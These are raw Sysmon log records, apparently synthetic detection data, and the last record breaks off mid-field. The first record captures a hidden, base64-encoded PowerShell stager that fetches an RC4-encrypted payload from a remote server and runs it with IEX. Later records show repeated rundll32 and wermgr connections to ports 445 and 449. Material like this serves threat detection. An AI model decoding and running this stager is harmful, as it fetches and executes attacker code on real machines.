<14>Jan  2 13:47:06 serhatg.local Microsoft-Windows-Sysmon[2074]: {"EventTime":1672667226,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":11153,"ProcessID":2074,"ThreadID":4242,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: v\r\nProcessGuid: {341034e7-3a71-62fb-600c-000000000600}\r\nProcessId: 6704\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: \"C:\\Windows\\system32\\whoami.exe\" /groups\r\nCurrentDirectory: C:\\Users\\user\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-b7e7-62f4-503c-020000000000}\r\nLogonId: 0x23C50\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {341034e7-3431-62fb-510c-000000000600}\r\nParentProcessId: 8040\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB4AEEARABFAEEATABnAEEAeABBAEQAZwBBAE0AUQBBADYAQQBEAGcAQQBNAEEAQQA0AEEARABnAEEAJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBzAGcAWABJAFkAdQBsAGoAJQBbAHQAYgAvAE8ARQBkAEMAPwApADoAKgAhAGEANgAzADkAZQBVAE4AVwBoADEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAVgBjAFUAbgBBAEUAVgBWAGIAdQB0AGgAPQBBAHUARgBuAGgANQBxAGMANwB1AFcASABYAFAAZgBtAHEAMABNAGcAeAAwAEIAMwBxAE4ATQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:47:06.000000","ProcessGuid":"{341034e7-3a71-62fb-600c-000000000600}","Image":"C:\\Windows\\System32\\whoami.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"whoami - displays logged on user information","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"whoami.exe","CommandLine":"\"C:\\Windows\\system32\\whoami.exe\" /groups","CurrentDirectory":"C:\\Users\\user\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-b7e7-62f4-503c-020000000000}","LogonId":"0x23c50","TerminalSessionId":"1","IntegrityLevel":"Medium","Hashes":"MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","ParentProcessGuid":"{341034e7-3431-62fb-510c-000000000600}","ParentProcessId":"8040","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB4AEEARABFAEEATABnAEEAeABBAEQAZwBBAE0AUQBBADYAQQBEAGcAQQBNAEEAQQA0AEEARABnAEEAJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBzAGcAWABJAFkAdQBsAGoAJQBbAHQAYgAvAE8ARQBkAEMAPwApADoAKgAhAGEANgAzADkAZQBVAE4AVwBoADEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAVgBjAFUAbgBBAEUAVgBWAGIAdQB0AGgAPQBBAHUARgBuAGgANQBxAGMANwB1AFcASABYAFAAZgBtAHEAMABNAGcAeAAwAEIAMwBxAE4ATQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667226,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:47:16 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667236,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:47:16.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\wermgr.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 449\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:47:16.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\wermgr.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"449","DestinationPortName":"-","EventReceivedTime":1672667236,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:47:26 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667246,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:47:26.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:47:26.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667246,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:47:36 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667256,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:47:36.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:47:36.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667256,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:47:46 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667266,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:47:46.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:47:46.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667266,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:47:56 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667276,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:47:56.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:47:56.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667276,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:48:06 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667286,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:48:06.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:48:06.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667286,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:48:16 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667296,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:48:16.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:48:16.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667296,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:48:26 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667306,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:48:26.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: serhatg.local\r\nSourcePort: 53969\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.164.15.198\r\nDestinationHostname: domain.internal\r\nDestinationPort: 445\r\nDestinationPortName: -","Category":"Network connection detected (rule: NetworkConnect)","Opcode":"Info","RuleName":"Proxy","UtcTime":"2023-01-02 13:48:26.000000","ProcessGuid":"{036b06e3-ecbe-639b-4800-000000001a00}","Image":"C:\\Windows\\System32\\rundll32.exe","User":"NT AUTHORITY\\SYSTEM","Protocol":"tcp","Initiated":"true","SourceIsIpv6":"false","SourceIp":"10.19.122.14","SourceHostname":"serhatg.local","SourcePort":"53969","SourcePortName":"-","DestinationIsIpv6":"false","DestinationIp":"10.164.15.198","DestinationHostname":"domain.internal","DestinationPort":"445","DestinationPortName":"-","EventReceivedTime":1672667306,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:48:37 serhatg.local Microsoft-Windows-Sysmon[3332]: {"EventTime":1672667317,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":3,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":3,"OpcodeValue":0,"RecordNumber":924213,"ProcessID":3332,"ThreadID":4200,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Network connection detected:\r\nRuleName: Proxy\r\nUtcTime: 2023-01-02 13:48:37.000000\r\nProcessGuid: {036b06e3-ecbe-639b-4800-000000001a00}\r\nProcessId: 2780\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.19.122.14\r\nSourceHostname: 